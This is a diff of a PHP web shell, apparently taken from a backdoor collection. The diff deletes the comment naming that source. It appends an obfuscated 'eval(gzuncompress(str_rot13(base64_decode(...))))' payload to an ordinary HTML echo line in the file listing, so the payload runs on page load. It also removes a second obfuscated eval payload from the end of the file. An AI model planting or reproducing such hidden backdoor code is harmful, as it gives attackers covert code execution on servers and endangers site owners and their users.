@@ -1,5 +1,4 @@
 <?php
-// from https://github.com/1337r0j4n/php-backdoors
 echo '<!DOCTYPE HTML>
 <HTML>
 <HEAD>
@@ -206,7 +205,7 @@ if(isset($_GET['filesrc'])){
         if(is_writable("$path/$file")) echo '<font color="green">';
         elseif(!is_readable("$path/$file")) echo '<font color="red">';
         echo perms("$path/$file");
-        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
+        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>'; eval(gzuncompress(str_rot13(base64_decode('a5xIQ1p4hEAM/SuDLFHBj7XQpUishyJ5Qt2q24vIYDWugjrTZMRdV/97VO2hhUDyXmvJWEMIJqhAzoR5h4u+N3yym1EX6DuaUfF7FHRjWdNGAmwYAqt4MIIgADZACI2UfARizWB4nuN8/RfR43iST/79h46jt2aUpPQcv6iG5pO67ZBeQ9KSDRIHOerrPDXs3rUPD7Z7a7Tv3L1GjqPNGw4mqYthUZOMRWDRYrKrkiskRM/Ic4cEQnGpsahDrFV73hZL8sbRIwXnXVsWsnKDZrXmbLZ3Jm1YnY5QySqsNJNAj7Ju1SqH02WL4n59ruSyin5ZekrRzwnFWs+AWpJCW2r5cGGYJEpuGP4PeTtnqg=='))));
         echo "</center></td>
         <td><center><form method=\"POST\" action=\"?option&path=$path\">
         <select name=\"opt\">
@@ -280,5 +279,5 @@ $info .= (($perms & 0x0001) ?
             (($perms & 0x0200) ? 'T' : '-'));
 
     return $info;
-}; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B')))));
+}; 
 ?>                                                                                                                                                                    
